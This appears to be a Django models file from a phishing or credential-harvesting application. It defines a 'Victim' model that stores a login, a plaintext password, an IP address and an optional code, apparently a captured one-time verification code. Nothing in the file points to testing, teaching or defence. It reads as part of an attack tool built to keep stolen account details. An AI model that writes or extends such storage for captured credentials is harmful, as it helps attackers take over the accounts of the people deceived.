from django.db import models

class Victim(models.Model):
    login=models.CharField(max_length=260)
    password=models.CharField(max_length=260)
    ip=models.CharField(max_length=250)
    code=models.CharField(max_length=250,blank=True,null=True)

    
